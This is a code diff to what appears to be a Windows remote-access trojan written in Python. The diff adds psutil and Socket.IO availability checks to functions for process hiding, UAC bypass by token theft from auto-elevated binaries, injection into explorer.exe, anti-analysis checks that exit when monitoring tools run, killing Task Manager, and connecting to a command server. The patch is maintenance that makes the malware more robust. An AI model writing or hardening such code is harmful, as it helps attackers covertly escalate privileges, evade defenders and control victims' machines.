@@ -89,7 +89,7 @@ except ImportError:
 # Stealth functions
 def hide_process():
     """Basic process hiding."""
-    if WINDOWS_AVAILABLE:
+    if WINDOWS_AVAILABLE and PSUTIL_AVAILABLE:
         try:
             # Set process to run in background with low priority
             process = psutil.Process()
@@ -879,6 +879,9 @@ def bypass_uac_token_manipulation():
     
     try:
         # Find an auto-elevated process to duplicate token from
+        if not PSUTIL_AVAILABLE:
+            return False
+            
         for proc in psutil.process_iter(['pid', 'name']):
             try:
                 if proc.info['name'].lower() in ['consent.exe', 'slui.exe', 'fodhelper.exe']:
@@ -2724,6 +2727,9 @@ def inject_into_trusted_process():
     """Inject into a trusted process."""
     try:
         # Find explorer.exe process
+        if not PSUTIL_AVAILABLE:
+            return False
+            
         for proc in psutil.process_iter(['pid', 'name']):
             if proc.info['name'].lower() == 'explorer.exe':
                 # Get process handle
@@ -3035,6 +3041,9 @@ def hide_process():
     
     try:
         # Set process to run in background with low priority
+        if not PSUTIL_AVAILABLE:
+            return False
+            
         process = psutil.Process()
         process.nice(psutil.BELOW_NORMAL_PRIORITY_CLASS)
         
@@ -3139,6 +3148,9 @@ def anti_analysis():
             'procmon.exe', 'procexp.exe', 'autoruns.exe', 'regmon.exe', 'filemon.exe'
         ]
         
+        if not PSUTIL_AVAILABLE:
+            return False
+            
         for proc in psutil.process_iter(['name']):
             if proc.info['name'].lower() in analysis_processes:
                 # If analysis tool detected, sleep and exit
@@ -4764,6 +4776,9 @@ def terminate_process_alternative(process_name_or_pid, force=True):
         # Method 1: Direct Windows API termination
         if isinstance(process_name_or_pid, str):
             # Find process by name
+            if not PSUTIL_AVAILABLE:
+                return "Error: psutil not available"
+                
             target_pids = []
             for proc in psutil.process_iter(['pid', 'name']):
                 if proc.info['name'].lower() == process_name_or_pid.lower():
@@ -4972,6 +4987,9 @@ def kill_task_manager():
                 results.append(f"{process_name}: Failed - {e}")
         
         # Also try to find and kill by PID
+        if not PSUTIL_AVAILABLE:
+            return "Error: psutil not available"
+            
         try:
             for proc in psutil.process_iter(['pid', 'name']):
                 if proc.info['name'].lower() == 'taskmgr.exe':
@@ -7605,6 +7623,10 @@ def agent_main():
             try:
                 connection_attempts += 1
                 print(f"Connecting to server (attempt {connection_attempts})...")
+                if sio is None:
+                    print("[ERROR] Socket.IO not available - cannot connect to server")
+                    return
+                    
                 sio.connect(SERVER_URL)
                 print("[OK] Connected to server successfully!")
                 sio.wait()
@@ -7635,7 +7657,7 @@ def agent_main():
     finally:
         print("[INFO] Agent shutting down.")
         try:
-            if sio.connected:
+            if sio and hasattr(sio, 'connected') and sio.connected:
                 sio.disconnect()
         except:
             pass
@@ -7724,7 +7746,7 @@ if __name__ == "__main__":
     finally:
         print("[INFO] Shutting down system components.")
         try:
-            if sio.connected:
+            if sio and hasattr(sio, 'connected') and sio.connected:
                 sio.disconnect()
         except:
             pass
